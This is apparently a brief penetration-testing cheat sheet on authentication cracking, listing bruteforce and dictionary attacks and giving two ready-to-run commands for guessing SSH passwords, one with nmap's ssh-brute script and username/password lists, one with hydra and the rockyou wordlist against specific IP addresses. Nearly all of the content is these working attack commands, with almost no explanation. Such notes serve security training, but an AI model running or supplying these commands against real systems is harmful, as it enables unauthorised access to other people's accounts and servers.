#### Authentication Cracking
|Types|Bruteforce Attack | Dictionary Attack |
|---|---|---|

> Factors Affecting Online Password Cracking: Latency, Delay, Processing time,etc....

#### SSH Bruteforce With Nmap

```
nmap 192.168.143.67 -p 22 --script ssh-brute --script-args userdb=username.txt,passdb=password.txt

```

#### SSH Bruteforce With Hydra
```
hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://192.194.185.3 -f

```
